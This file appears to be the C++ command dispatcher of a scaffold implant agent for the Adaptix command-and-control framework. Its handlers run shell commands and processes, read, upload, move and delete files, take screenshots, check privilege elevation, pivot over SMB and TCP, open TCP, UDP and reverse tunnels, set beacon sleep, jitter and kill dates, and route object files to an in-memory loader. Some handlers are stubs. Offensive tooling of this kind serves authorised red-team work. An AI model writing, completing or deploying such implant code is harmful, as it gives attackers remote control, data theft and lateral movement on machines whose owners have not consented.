// __NAME__ Agent — Commander Implementation (adaptix_default protocol)
//
// Wire format (server → agent, Little-Endian):
//   [LE uint32 totalSize][repeated: [LE uint32 cmdCode][LE fields…][LE uint32 taskId]]
//
// Wire format (agent → server, Big-Endian):
//   [BE uint32 totalBlobSize][repeated: [BE uint32 taskId][BE uint32 cmdCode][BE fields…]]
//
// Command coverage bands for this scaffold (not a claim of full implant parity):
//   C3 — protocol-aligned runnable scaffold path
//   C2 — thin platform-backed implementation suitable as a template starting point
//   C1 — explicit boundary/TODO/unsupported surface left for the developer

#include "Commander.h"
#include "Agent.h"
#include "JobsController.h"
#include "AsyncQueue.h"
#include "RuntimeErrors.h"
#include "RuntimeCommon.h"
#include "TransportScaffold.h"
#include "bof_loader.h"
#include "../protocol/protocol.h"

#include <stdio.h>
#include <map>
#include <string>
#include <vector>

struct MemoryChunkBuffer {
    uint32_t totalSize;
    std::vector<BYTE> data;
};

static std::map<uint32_t, MemoryChunkBuffer>& memoryStore()
{
    static std::map<uint32_t, MemoryChunkBuffer> store;
    return store;
}

static WriterBE* buildOutputMessageResp(uint32_t kind, const uint8_t* data, uint32_t len)
{
    WriterBE* w = WriterBEInit(32 + len);
    WriterBEWriteUint32(w, kind);
    WriterBEWriteBytes(w, data, len);
    return w;
}

Commander::Commander(Agent* a)
{
    this->agent = a;
}

Commander::~Commander()
{
}

// ─── WriterBE raw append (no length prefix) ────────────────────────────────────

static void WriterBEAppendRaw(WriterBE* w, const uint8_t* data, uint32_t len)
{
    while (w->size + len > w->capacity) {
        w->capacity = (w->capacity == 0) ? 256 : w->capacity * 2;
        w->data = (uint8_t*)realloc(w->data, w->capacity);
    }
    if (len > 0 && data) {
        memcpy(w->data + w->size, data, len);
        w->size += len;
    }
}

// ─── Error response: [BE uint32 errorCode] under COMMAND_ERROR ─────────────────

static WriterBE* buildCommandErrorResp(uint32_t code)
{
    WriterBE* w = WriterBEInit(16);
    WriterBEWriteUint32(w, code);
    return w;
}

static WriterBE* buildSystemErrorResp()
{
    return buildCommandErrorResp(runtime_errors::MapSystemErrorCode(GetLastError()));
}

static WriterBE* buildUnsupportedResp()
{
    return buildCommandErrorResp(runtime_errors::UnsupportedCommandErrorCode());
}

// ─── Profile sub-command handler ───────────────────────────────────────────────

static WriterBE* handleProfile(Agent* agent, ReaderLE* r, uint32_t subcmd)
{
    WriterBE* w = WriterBEInit(64);
    WriterBEWriteUint32(w, subcmd);

    switch (subcmd) {
    case 1: { // sleep + jitter
        uint32_t sleep  = ReaderLEReadUint32(r);
        uint32_t jitter = ReaderLEReadUint32(r);
        agent->sleepMs = sleep * 1000;
        agent->jitter  = jitter;
        WriterBEWriteUint32(w, sleep);
        WriterBEWriteUint32(w, jitter);
        break;
    }
    case 2: { // download chunk size
        uint32_t size = ReaderLEReadUint32(r);
        WriterBEWriteUint32(w, size);
        break;
    }
    case 3: { // killdate
        uint32_t kd = ReaderLEReadUint32(r);
        agent->killDate = (INT64)kd;
        WriterBEWriteUint32(w, kd);
        break;
    }
    case 4: { // workingtime
        uint32_t wt = ReaderLEReadUint32(r);
        runtime_common::DecodeWorkingTime(wt, &agent->workStart, &agent->workEnd);
        WriterBEWriteUint32(w, wt);
        break;
    }
    case 5: { // burst set
        uint32_t enabled    = ReaderLEReadUint32(r);
        uint32_t burstSleep = ReaderLEReadUint32(r);
        uint32_t burstJit   = ReaderLEReadUint32(r);
        WriterBEWriteUint32(w, enabled);
        WriterBEWriteUint32(w, burstSleep);
        WriterBEWriteUint32(w, burstJit);
        break;
    }
    case 6: { // burst show
        WriterBEWriteUint32(w, 0);  // enabled
        WriterBEWriteUint32(w, 50); // sleep ms
        WriterBEWriteUint32(w, 0);  // jitter
        break;
    }
    default:
        break;
    }
    return w;
}

// ═══════════════════════════════════════════════════════════════════════════════
// ProcessCommandTasks — adaptix_default protocol dispatcher
// ═══════════════════════════════════════════════════════════════════════════════

void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, BYTE* outBuf, ULONG* outSize)
{
    *outSize = 0;
    if (!recv || recvSize < 4)
        return;

    ReaderLE r;
    ReaderLEInit(&r, recv, recvSize);

    uint32_t totalSize = ReaderLEReadUint32(&r);
    (void)totalSize;

    // Output: one big WriterBE, start with placeholder for totalBlobSize
    WriterBE* out = WriterBEInit(1024);
    WriterBEWriteUint32(out, 0); // placeholder

    BOOL hasAnyResp = FALSE;

    while (r.offset + 4 <= r.size) {
        uint32_t cmdCode = ReaderLEReadUint32(&r);

        WriterBE* respW = NULL;
        uint32_t respCmdCode = cmdCode;
        uint32_t taskId = 0;
        BOOL taskIdConsumed = FALSE;

        switch (cmdCode) {

        // ── L3: Exit / Terminate ───────────────────────────────────────────

        case COMMAND_TERMINATE: {
            ReaderLEReadUint32(&r); // subcode
            ExitProcess(0);
            break;
        }
        case COMMAND_EXIT: {
            ReaderLEReadUint32(&r); // exitMethod
            ExitProcess(0);
            break;
        }

        // ── L3: PWD ────────────────────────────────────────────────────────

        case COMMAND_PWD: {
            char cwd[MAX_PATH];
            DWORD len = GetCurrentDirectoryA(MAX_PATH, cwd);
            if (len == 0) {
                respW = buildSystemErrorResp();
                respCmdCode = COMMAND_ERROR;
            } else {
                respW = WriterBEInit(256);
                WriterBEWriteString(respW, cwd);
            }
            break;
        }

        // ── L3: CD ─────────────────────────────────────────────────────────

        case COMMAND_CD: {
            char* path = ReaderLEReadString(&r);
            if (!SetCurrentDirectoryA(path)) {
                respW = buildSystemErrorResp();
                respCmdCode = COMMAND_ERROR;
            } else {
                char cwd[MAX_PATH];
                GetCurrentDirectoryA(MAX_PATH, cwd);
                respW = WriterBEInit(256);
                WriterBEWriteString(respW, cwd);
            }
            free(path);
            break;
        }

        // ── L3: CAT ────────────────────────────────────────────────────────

        case COMMAND_CAT: {
            char* path = ReaderLEReadString(&r);
            HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                                       OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hFile == INVALID_HANDLE_VALUE) {
                respW = buildSystemErrorResp();
                respCmdCode = COMMAND_ERROR;
                free(path); break;
            }
            DWORD fileSize = GetFileSize(hFile, NULL);
            BYTE* buf = (BYTE*)malloc(fileSize > 0 ? fileSize : 1);
            DWORD bytesRead = 0;
            ReadFile(hFile, buf, fileSize, &bytesRead, NULL);
            CloseHandle(hFile);

            respW = WriterBEInit(256 + bytesRead);
            WriterBEWriteString(respW, path);
            WriterBEWriteBytes(respW, buf, bytesRead);
            free(buf); free(path);
            break;
        }

        // ── L3: MKDIR ──────────────────────────────────────────────────────

        case COMMAND_MKDIR: {
            char* path = ReaderLEReadString(&r);
            if (!runtime_common::MkdirRecursive(path)) {
                respW = buildSystemErrorResp();
                respCmdCode = COMMAND_ERROR;
            } else {
                respW = WriterBEInit(64);
                WriterBEWriteString(respW, path);
            }
            free(path);
            break;
        }

        // ── L3: RM ─────────────────────────────────────────────────────────

        case COMMAND_RM: {
            char* path = ReaderLEReadString(&r);
            if (!runtime_common::RemoveRecursive(path)) {
                respW = buildSystemErrorResp();
                respCmdCode = COMMAND_ERROR;
            }
            else {
                respW = WriterBEInit(4);
                // empty response body
            }
            free(path);
            break;
        }

        // ── L3: MV ─────────────────────────────────────────────────────────

        case COMMAND_MV: {
            char* src = ReaderLEReadString(&r);
            char* dst = ReaderLEReadString(&r);
            if (!MoveFileA(src, dst)) {
                respW = buildSystemErrorResp();
                respCmdCode = COMMAND_ERROR;
            }
            else {
                respW = WriterBEInit(4);
            }
            free(src); free(dst);
            break;
        }

        // ── L3: COPY ───────────────────────────────────────────────────────

        case COMMAND_COPY: {
            char* src = ReaderLEReadString(&r);
            char* dst = ReaderLEReadString(&r);
            if (!CopyFileA(src, dst, FALSE)) {
                respW = buildSystemErrorResp();
                respCmdCode = COMMAND_ERROR;
            }
            else {
                respW = WriterBEInit(4);
            }
            free(src); free(dst);
            break;
        }

        // ── L3: KILL ───────────────────────────────────────────────────────

        case COMMAND_KILL: {
            uint32_t pid = ReaderLEReadUint32(&r);
            HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
            if (!hProc) {
                respW = buildSystemErrorResp();
                respCmdCode = COMMAND_ERROR;
            } else {
                if (!TerminateProcess(hProc, 1)) {
                    respW = buildSystemErrorResp();
                    respCmdCode = COMMAND_ERROR;
                }
                else {
                    respW = WriterBEInit(4);
                }
                CloseHandle(hProc);
            }
            break;
        }

        // ── L3: PS_KILL ────────────────────────────────────────────────────

        case COMMAND_PS_KILL: {
            uint32_t pid = ReaderLEReadUint32(&r);
            HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
            if (!hProc) {
                respW = buildSystemErrorResp();
                respCmdCode = COMMAND_ERROR;
            } else {
                if (!TerminateProcess(hProc, 1)) {
                    respW = buildSystemErrorResp();
                    respCmdCode = COMMAND_ERROR;
                }
                else {
                    respW = WriterBEInit(4);
                }
                CloseHandle(hProc);
            }
            break;
        }

        // ── L3: PROFILE ────────────────────────────────────────────────────

        case COMMAND_PROFILE: {
            uint32_t subcmd = ReaderLEReadUint32(&r);
            respW = handleProfile(agent, &r, subcmd);
            break;
        }

        // ── L2: LS ─────────────────────────────────────────────────────────

        case COMMAND_LS: {
            char* dir = ReaderLEReadString(&r);
            char searchDir[MAX_PATH];
            if (!dir || strlen(dir) == 0) {
                GetCurrentDirectoryA(MAX_PATH, searchDir);
            } else {
                strncpy(searchDir, dir, MAX_PATH - 1);
                searchDir[MAX_PATH - 1] = '\0';
            }

            char findPath[MAX_PATH];
            snprintf(findPath, MAX_PATH, "%s\\*", searchDir);

            WIN32_FIND_DATAA fd;
            HANDLE hFind = FindFirstFileA(findPath, &fd);
            if (hFind == INVALID_HANDLE_VALUE) {
                respW = WriterBEInit(16);
                WriterBEWriteUint8(respW, 0); // result = error
                WriterBEWriteUint32(respW, 1);
                free(dir); break;
            }

            respW = WriterBEInit(4096);
            WriterBEWriteUint8(respW, 1); // result = success

            // path + \* suffix
            char absPath[MAX_PATH];
            snprintf(absPath, MAX_PATH, "%s\\*", searchDir);
            WriterBEWriteString(respW, absPath);

            // Count entries first, then write
            // Actually, write count placeholder, fill entries, patch count
            uint32_t countPos = respW->size;
            WriterBEWriteUint32(respW, 0); // placeholder

            uint32_t entryCount = 0;
            do {
                if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0)
                    continue;
                BOOL isDir = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0;
                int64_t fsize = ((int64_t)fd.nFileSizeHigh << 32) | fd.nFileSizeLow;

                SYSTEMTIME st;
                FileTimeToSystemTime(&fd.ftLastWriteTime, &st);
                // Encode date as unix-ish epoch seconds
                FILETIME localFt;
                FileTimeToLocalFileTime(&fd.ftLastWriteTime, &localFt);
                ULARGE_INTEGER uli;
                uli.LowPart  = localFt.dwLowDateTime;
                uli.HighPart = localFt.dwHighDateTime;
                // Convert FILETIME (100ns since 1601) to unix timestamp
                uint32_t unixTime = (uint32_t)((uli.QuadPart - 116444736000000000ULL) / 10000000ULL);

                WriterBEWriteUint8(respW, isDir ? 1 : 0);
                WriterBEWriteUint64(respW, (uint64_t)fsize);
                WriterBEWriteUint32(respW, unixTime);
                WriterBEWriteString(respW, fd.cFileName);
                entryCount++;
            } while (FindNextFileA(hFind, &fd));
            FindClose(hFind);

            // Patch entry count (BE uint32)
            respW->data[countPos + 0] = (uint8_t)(entryCount >> 24);
            respW->data[countPos + 1] = (uint8_t)(entryCount >> 16);
            respW->data[countPos + 2] = (uint8_t)(entryCount >> 8);
            respW->data[countPos + 3] = (uint8_t)(entryCount);
            free(dir);
            break;
        }

        // ── L2: PS_LIST (empty result) ─────────────────────────────────────

        case COMMAND_PS_LIST: {
            // Return empty list
            respW = WriterBEInit(16);
            WriterBEWriteUint8(respW, 1); // result = success
            WriterBEWriteUint32(respW, 0); // count = 0
            break;
        }

        // ── L2: GETUID ─────────────────────────────────────────────────────

        case COMMAND_GETUID: {
            char username[256] = {0};
            DWORD uLen = sizeof(username);
            GetUserNameA(username, &uLen);
            char domain[256] = {0};
            GetEnvironmentVariableA("USERDOMAIN", domain, sizeof(domain));

            BOOL elevated = FALSE;
            HANDLE hToken = NULL;
            if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
                TOKEN_ELEVATION elev = {0};
                DWORD retLen = 0;
                if (GetTokenInformation(hToken, TokenElevation, &elev, sizeof(elev), &retLen))
                    elevated = elev.TokenIsElevated;
                CloseHandle(hToken);
            }

            respW = WriterBEInit(256);
            WriterBEWriteUint8(respW, elevated ? 1 : 0);
            WriterBEWriteString(respW, domain);
            WriterBEWriteString(respW, username);
            break;
        }

        // ── L2: JOB_LIST (empty) ───────────────────────────────────────────

        case COMMAND_JOB_LIST: {
            std::vector<uint32_t> shellJobs = transport_scaffold::ShellJobEntries();
            Job* jobsList = NULL;
            int jobCount = agent->jobs ? agent->jobs->List(&jobsList) : 0;
            uint32_t totalCount = (uint32_t)jobCount + (uint32_t)shellJobs.size();

            respW = WriterBEInit(16 + totalCount * 8);
            WriterBEWriteUint32(respW, totalCount);

            for (int i = 0; i < jobCount; ++i) {
                WriterBEWriteUint32(respW, jobsList[i].jobId);
                WriterBEWriteUint16(respW, (uint16_t)jobsList[i].jobType);
                WriterBEWriteUint16(respW, 0);
            }
            if (jobsList) {
                LocalFree(jobsList);
            }
            for (size_t i = 0; i < shellJobs.size(); ++i) {
                WriterBEWriteUint32(respW, shellJobs[i]);
                WriterBEWriteUint16(respW, (uint16_t)JOB_TYPE_SHELL);
                WriterBEWriteUint16(respW, 0);
            }
            break;
        }

        // ── L2: JOBS_KILL (not found result) ───────────────────────────────

        case COMMAND_JOBS_KILL: {
            uint32_t jobId = ReaderLEReadUint32(&r);
            respW = WriterBEInit(16);
            BOOL result = transport_scaffold::KillShellJob(jobId) || (agent->jobs && agent->jobs->Kill(jobId));
            WriterBEWriteUint8(respW, result ? 1 : 0);
            WriterBEWriteUint32(respW, jobId);
            break;
        }

        // ── L2: RUN ────────────────────────────────────────────────────────

        case COMMAND_RUN: {
            char* prog = ReaderLEReadString(&r);
            char* args = ReaderLEReadString(&r);
            taskId = ReaderLEReadUint32(&r); // taskId is inside RUN data
            taskIdConsumed = TRUE;
            DWORD pid = 0;
            if (!runtime_common::RunDetachedProcess(prog, args, &pid)) {
                respW = buildSystemErrorResp();
                respCmdCode = COMMAND_ERROR;
            } else {
                respW = WriterBEInit(64 + (uint32_t)strlen(prog));
                WriterBEWriteUint32(respW, pid);
                WriterBEWriteUint8(respW, 0);
                WriterBEWriteString(respW, prog);
            }
            free(prog); free(args);
            break;
        }

        // ── L2: SHELL ──────────────────────────────────────────────────────

        case COMMAND_SHELL: {
            char* cmdLine = ReaderLEReadString(&r);
            std::string output;
            if (!runtime_common::RunShellCapture(cmdLine, &output)) {
                respW = buildSystemErrorResp();
                respCmdCode = COMMAND_ERROR;
            } else {
                respW = WriterBEInit((uint32_t)output.size() + 32);
                WriterBEWriteString(respW, output.c_str());
            }
            free(cmdLine);
            break;
        }

        // ── L2: SCREENSHOT ─────────────────────────────────────────────────

        case COMMAND_SCREENSHOT: {
            std::vector<BYTE> img;
            if (!runtime_common::CaptureScreenshotPng(&img)) {
                respW = buildSystemErrorResp();
                respCmdCode = COMMAND_ERROR;
            } else {
                respW = WriterBEInit((uint32_t)img.size() + 16);
                WriterBEWriteBytes(respW, img.data(), (uint32_t)img.size());
            }
            break;
        }

        // ── L2: ZIP ────────────────────────────────────────────────────────

        case COMMAND_ZIP: {
            char* srcPath = ReaderLEReadString(&r);
            char* zipPath = ReaderLEReadString(&r);
            if (!runtime_common::ZipPathToFile(srcPath, zipPath)) {
                respW = buildSystemErrorResp();
                respCmdCode = COMMAND_ERROR;
            } else {
                respW = WriterBEInit((uint32_t)strlen(zipPath) + 16);
                WriterBEWriteString(respW, zipPath);
            }
            free(srcPath); free(zipPath);
            break;
        }

        // ── L2: PS_RUN / REV2SELF / SAVEMEMORY / UPLOAD / EXFIL ───────────

        case COMMAND_PS_RUN: {
            BOOL outputRequested = ReaderLEReadUint8(&r) ? TRUE : FALSE;
            BOOL impersonation   = ReaderLEReadUint8(&r) ? TRUE : FALSE;
            ReaderLEReadUint32(&r);
            char* commandLine = ReaderLEReadString(&r);

            if (outputRequested || impersonation) {
                respW = buildUnsupportedResp();
                respCmdCode = COMMAND_ERROR;
            } else {
                STARTUPINFOA si = {};
                PROCESS_INFORMATION pi = {};
                si.cb = sizeof(si);
                std::string cmd = commandLine ? std::string(commandLine) : std::string();
                std::vector<char> cmdBuf(cmd.begin(), cmd.end());
                cmdBuf.push_back('\0');
                if (!CreateProcessA(NULL, cmdBuf.data(), NULL, NULL, FALSE, CREATE_NO_WINDOW | DETACHED_PROCESS, NULL, NULL, &si, &pi)) {
                    respW = buildSystemErrorResp();
                    respCmdCode = COMMAND_ERROR;
                } else {
                    respW = WriterBEInit((uint32_t)cmd.size() + 16);
                    WriterBEWriteUint32(respW, pi.dwProcessId);
                    WriterBEWriteUint8(respW, 0);
                    WriterBEWriteString(respW, commandLine ? commandLine : "");
                    CloseHandle(pi.hThread);
                    CloseHandle(pi.hProcess);
                }
            }
            free(commandLine);
            break;
        }

        case COMMAND_REV2SELF: {
            respW = WriterBEInit(4);
            break;
        }

        case COMMAND_SAVEMEMORY: {
            uint32_t memoryId = ReaderLEReadUint32(&r);
            uint32_t totalSize = ReaderLEReadUint32(&r);
            uint32_t chunkLen = 0;
            uint8_t* chunk = ReaderLEReadBytes(&r, &chunkLen);
            MemoryChunkBuffer& entry = memoryStore()[memoryId];
            if (entry.totalSize == 0) {
                entry.totalSize = totalSize;
            }
            if (chunk && chunkLen > 0) {
                entry.data.insert(entry.data.end(), chunk, chunk + chunkLen);
            }
            break;
        }

        case COMMAND_UPLOAD: {
            uint32_t memoryId = ReaderLEReadUint32(&r);
            char* remotePath = ReaderLEReadString(&r);
            std::map<uint32_t, MemoryChunkBuffer>::iterator it = memoryStore().find(memoryId);
            if (it == memoryStore().end()) {
                respW = buildCommandErrorResp(ERROR_FILE_NOT_FOUND);
                respCmdCode = COMMAND_ERROR;
            } else {
                std::vector<BYTE> data = it->second.data;
                if (it->second.totalSize > 0 && data.size() > it->second.totalSize) {
                    data.resize(it->second.totalSize);
                }
                HANDLE hFile = CreateFileA(remotePath, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                if (hFile == INVALID_HANDLE_VALUE) {
                    respW = buildSystemErrorResp();
                    respCmdCode = COMMAND_ERROR;
                } else {
                    DWORD written = 0;
                    BOOL ok = data.empty() ? TRUE : WriteFile(hFile, data.data(), (DWORD)data.size(), &written, NULL);
                    CloseHandle(hFile);
                    if (!ok || written != data.size()) {
                        respW = buildSystemErrorResp();
                        respCmdCode = COMMAND_ERROR;
                    } else {
                        respW = WriterBEInit(4);
                    }
                }
                memoryStore().erase(it);
            }
            free(remotePath);
            break;
        }

        case COMMAND_EXFIL: {
            uint32_t state = ReaderLEReadUint32(&r);
            uint32_t fileId = ReaderLEReadUint32(&r);
            respW = WriterBEInit(16);
            WriterBEWriteUint32(respW, fileId);
            WriterBEWriteUint8(respW, (uint8_t)state);
            respCmdCode = COMMAND_EXFIL;
            break;
        }

        // ── L3: interactive shell scaffold ─────────────────────────────────

        case COMMAND_SHELL_START: {
            uint32_t shellId = ReaderLEReadUint32(&r);
            char* programArgs = ReaderLEReadString(&r);
            DWORD errCode = 0;
            respW = WriterBEInit(16);
            WriterBEWriteUint8(respW, JOB_TYPE_SHELL);
            if (transport_scaffold::StartShellSession(shellId, programArgs, &errCode)) {
                WriterBEWriteUint8(respW, JOB_STATE_STARTING);
            } else {
                WriterBEWriteUint8(respW, JOB_STATE_FINISHED);
                WriterBEWriteUint32(respW, runtime_errors::MapSystemErrorCode(errCode));
            }
            respCmdCode = COMMAND_JOB;
            taskId = shellId;
            taskIdConsumed = TRUE;
            free(programArgs);
            break;
        }

        case COMMAND_SHELL_WRITE: {
            uint32_t shellId = ReaderLEReadUint32(&r);
            uint32_t payloadLen = 0;
            uint8_t* payload = ReaderLEReadBytes(&r, &payloadLen);
            DWORD errCode = 0;
            if (!transport_scaffold::WriteShellInput(shellId, payload, payloadLen, &errCode)) {
                respW = buildCommandErrorResp(runtime_errors::MapSystemErrorCode(errCode));
                respCmdCode = COMMAND_ERROR;
            }
            taskId = shellId;
            taskIdConsumed = TRUE;
            break;
        }

        case COMMAND_SHELL_CLOSE: {
            uint32_t shellId = ReaderLEReadUint32(&r);
            transport_scaffold::CloseShellSession(shellId);
            taskId = shellId;
            taskIdConsumed = TRUE;
            break;
        }

        // ── L3: pivot scaffold ─────────────────────────────────────────────

        case COMMAND_LINK: {
            uint32_t pivotType = ReaderLEReadUint32(&r);
            if (pivotType == transport_scaffold::PIVOT_TYPE_SMB) {
                char* pipeName = ReaderLEReadString(&r);
                uint32_t linkTaskId = ReaderLEReadUint32(&r);
                taskId = linkTaskId;
                taskIdConsumed = TRUE;

                std::vector<uint8_t> payload;
                DWORD errCode = 0;
                if (transport_scaffold::StartPivotSmb(linkTaskId, pipeName, &payload, &errCode)) {
                    respW = WriterBEInit((uint32_t)payload.size() + 8);
                    WriterBEAppendRaw(respW, payload.data(), (uint32_t)payload.size());
                } else {
                    respW = buildCommandErrorResp(runtime_errors::MapSystemErrorCode(errCode));
                    respCmdCode = COMMAND_ERROR;
                }
                free(pipeName);
            } else if (pivotType == transport_scaffold::PIVOT_TYPE_TCP) {
                char* address = ReaderLEReadString(&r);
                uint32_t port = ReaderLEReadUint32(&r);
                uint32_t linkTaskId = ReaderLEReadUint32(&r);
                taskId = linkTaskId;
                taskIdConsumed = TRUE;

                std::vector<uint8_t> payload;
                DWORD errCode = 0;
                if (transport_scaffold::StartPivotTcp(linkTaskId, address, (uint16_t)port, &payload, &errCode)) {
                    respW = WriterBEInit((uint32_t)payload.size() + 8);
                    WriterBEAppendRaw(respW, payload.data(), (uint32_t)payload.size());
                } else {
                    respW = buildCommandErrorResp(runtime_errors::MapSystemErrorCode(errCode));
                    respCmdCode = COMMAND_ERROR;
                }
                free(address);
            } else {
                respW = buildUnsupportedResp();
                respCmdCode = COMMAND_ERROR;
            }
            respCmdCode = (respCmdCode == COMMAND_ERROR) ? COMMAND_ERROR : COMMAND_LINK;
            break;
        }

        case COMMAND_UNLINK: {
            uint32_t pivotId = ReaderLEReadUint32(&r);
            uint32_t unlinkTaskId = ReaderLEReadUint32(&r);
            taskId = unlinkTaskId;
            taskIdConsumed = TRUE;
            respW = WriterBEInit(16);
            WriterBEWriteUint32(respW, pivotId);
            WriterBEWriteUint8(respW, transport_scaffold::ClosePivotSession(pivotId));
            respCmdCode = COMMAND_UNLINK;
            break;
        }

        case COMMAND_PIVOT_EXEC: {
            uint32_t pivotId = ReaderLEReadUint32(&r);
            uint32_t payloadLen = 0;
            uint8_t* payload = ReaderLEReadBytes(&r, &payloadLen);
            DWORD errCode = 0;
            if (!transport_scaffold::WritePivotData(pivotId, payload, payloadLen, &errCode)) {
                respW = buildCommandErrorResp(runtime_errors::MapSystemErrorCode(errCode));
                respCmdCode = COMMAND_ERROR;
            }
            break;
        }

        // ── L3: tunnel scaffold ────────────────────────────────────────────

        case COMMAND_TUNNEL_START_TCP: {
            uint32_t channelId = ReaderLEReadUint32(&r);
            uint32_t tunnelType = ReaderLEReadUint32(&r);
            char* address = ReaderLEReadString(&r);
            uint32_t port = ReaderLEReadUint32(&r);
            uint32_t tunnelTaskId = ReaderLEReadUint32(&r);
            taskId = tunnelTaskId;
            taskIdConsumed = TRUE;

            std::vector<uint8_t> payload;
            DWORD errCode = 0;
            transport_scaffold::StartTcpTunnel(channelId, tunnelType, address, (uint16_t)port, &payload, &errCode);
            respW = WriterBEInit((uint32_t)payload.size() + 8);
            WriterBEAppendRaw(respW, payload.data(), (uint32_t)payload.size());
            respCmdCode = COMMAND_TUNNEL_START_TCP;
            free(address);
            break;
        }

        case COMMAND_TUNNEL_START_UDP: {
            uint32_t channelId = ReaderLEReadUint32(&r);
            char* address = ReaderLEReadString(&r);
            uint32_t port = ReaderLEReadUint32(&r);
            uint32_t tunnelTaskId = ReaderLEReadUint32(&r);
            taskId = tunnelTaskId;
            taskIdConsumed = TRUE;

            std::vector<uint8_t> payload;
            DWORD errCode = 0;
            transport_scaffold::StartUdpTunnel(channelId, address, (uint16_t)port, &payload, &errCode);
            respW = WriterBEInit((uint32_t)payload.size() + 8);
            WriterBEAppendRaw(respW, payload.data(), (uint32_t)payload.size());
            respCmdCode = COMMAND_TUNNEL_START_TCP;
            free(address);
            break;
        }

        case COMMAND_TUNNEL_WRITE_TCP:
        case COMMAND_TUNNEL_WRITE_UDP: {
            uint32_t channelId = ReaderLEReadUint32(&r);
            uint32_t payloadLen = 0;
            uint8_t* payload = ReaderLEReadBytes(&r, &payloadLen);
            DWORD errCode = 0;
            if (!transport_scaffold::WriteTunnelData(channelId, payload, payloadLen, &errCode)) {
                transport_scaffold::NoteTunnelWriteFailure(channelId, runtime_errors::MapSystemErrorCode(errCode));
            }
            taskId = channelId;
            taskIdConsumed = TRUE;
            break;
        }

        case COMMAND_TUNNEL_CLOSE: {
            uint32_t channelId = ReaderLEReadUint32(&r);
            transport_scaffold::CloseTunnelSession(channelId);
            taskId = channelId;
            taskIdConsumed = TRUE;
            break;
        }

        case COMMAND_TUNNEL_REVERSE: {
            uint32_t tunnelId = ReaderLEReadUint32(&r);
            uint32_t port = ReaderLEReadUint32(&r);
            uint32_t tunnelTaskId = ReaderLEReadUint32(&r);
            taskId = tunnelTaskId;
            taskIdConsumed = TRUE;

            std::vector<uint8_t> payload = transport_scaffold::StartReverseTunnel(tunnelId, (uint16_t)port);
            respW = WriterBEInit((uint32_t)payload.size() + 8);
            WriterBEAppendRaw(respW, payload.data(), (uint32_t)payload.size());
            respCmdCode = COMMAND_TUNNEL_REVERSE;
            break;
        }

        case COMMAND_TUNNEL_ACCEPT: {
            ReaderLEReadUint32(&r);
            break;
        }

        case COMMAND_TUNNEL_PAUSE: {
            uint32_t channelId = ReaderLEReadUint32(&r);
            transport_scaffold::SetTunnelPaused(channelId, TRUE);
            taskId = channelId;
            taskIdConsumed = TRUE;
            break;
        }

        case COMMAND_TUNNEL_RESUME: {
            uint32_t channelId = ReaderLEReadUint32(&r);
            transport_scaffold::SetTunnelPaused(channelId, FALSE);
            taskId = channelId;
            taskIdConsumed = TRUE;
            break;
        }

        // ── L2: BOF (routes through scaffold loader surface) ───────────────

        case COMMAND_EXEC_BOF: {
            BOOL async = ReaderLEReadUint8(&r) ? TRUE : FALSE;
            char* entry = ReaderLEReadString(&r); // entry function
            uint32_t bofLen;
            uint8_t* bof = ReaderLEReadBytes(&r, &bofLen); // [4B len][bof data] — returns ptr, don't free
            uint32_t argsLen;
            uint8_t* args = ReaderLEReadBytes(&r, &argsLen); // [4B len][args data]

            BofContext* ctx = async
                ? ObjectExecuteAsync(bof, bofLen, args, (int)argsLen)
                : ObjectExecute(bof, bofLen, args, (int)argsLen);

            if (!ctx || ctx->msgCount == 0) {
                const char* msg = async
                    ? "async BOF execution requires the native loader implementation"
                    : "BOF execution requires the native loader implementation";
                respW = buildOutputMessageResp(CALLBACK_ERROR, (const uint8_t*)msg, (uint32_t)strlen(msg));
            } else {
                    respW = buildOutputMessageResp((uint32_t)ctx->msgs[0].type, ctx->msgs[0].data, (uint32_t)ctx->msgs[0].dataLen);
            }
            respCmdCode = COMMAND_EXEC_BOF_OUT;
            if (ctx) {
                BofContextFree(ctx);
            }
            free(entry);
            break;
        }

        default:
            // Unknown command — try to skip gracefully, but since we don't
            // know the field layout we can't guarantee correct parsing.
            break;
        }

        // Read taskId if not consumed by the handler
        if (!taskIdConsumed && r.offset + 4 <= r.size) {
            taskId = ReaderLEReadUint32(&r);
        }

        // Emit response: [BE taskId][BE cmdCode][response data]
        if (respW && respW->size > 0) {
            WriterBEWriteUint32(out, taskId);
            WriterBEWriteUint32(out, respCmdCode);
            WriterBEAppendRaw(out, respW->data, respW->size);
            hasAnyResp = TRUE;
        }
        if (respW)
            WriterBEFree(respW);
    }

    if (!hasAnyResp) {
        WriterBEFree(out);
        return;
    }

    // Patch totalBlobSize at offset 0 (BE uint32, includes itself)
    uint32_t total = out->size;
    out->data[0] = (uint8_t)(total >> 24);
    out->data[1] = (uint8_t)(total >> 16);
    out->data[2] = (uint8_t)(total >> 8);
    out->data[3] = (uint8_t)(total);

    memcpy(outBuf, out->data, out->size);
    *outSize = out->size;
    WriterBEFree(out);
}

